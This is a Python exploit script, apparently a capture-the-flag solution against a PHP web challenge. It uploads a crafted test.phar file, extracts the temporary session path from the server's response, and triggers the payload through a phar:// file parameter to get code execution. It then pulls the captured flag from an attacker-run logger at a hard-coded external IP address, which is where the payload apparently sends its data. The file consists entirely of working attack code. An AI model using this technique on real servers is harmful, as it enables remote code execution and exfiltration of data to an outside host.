import requests
import sys
import re

TARGET = sys.argv[1]
PORT = sys.argv[2]
URL = f"http://{TARGET}:{PORT}/"

session = requests.Session()

def upload_phar():
    with open("test.phar", "rb") as phar:
        files = {"file": ("test.phar", phar, "application/octet-stream")}
        response = session.post(URL + "upload.php", files=files)

    pattern = r"/tmp/([a-f0-9]{32})/test"
    match = re.search(pattern, response.text)
    if match:
        sess_id = match.group(1)
        return sess_id
    else:
        raise ValueError("Could not find sess_id in the response.")

def execute_payload(sess_id):
    exec_url = f"http://{TARGET}:{PORT}/?file=Phar:///tmp/{sess_id}/test.phar"
    response = session.get(exec_url)
    return response.text

def get_flag():
    web_logger = "http://35.226.119.214:6969"  # Replace with the actual URL
    response = requests.get(web_logger)
    content = response.text
    flags = re.findall(r'FLAG\{[0-9a-zA-Z_]+\}', content)
    for flag in flags:
        return flag
    

def main():
    sess_id = upload_phar()
    execute_payload(sess_id)
    flag = get_flag()
    print(f'''FLAG!{flag}!''')


if __name__ == "__main__":
    main()
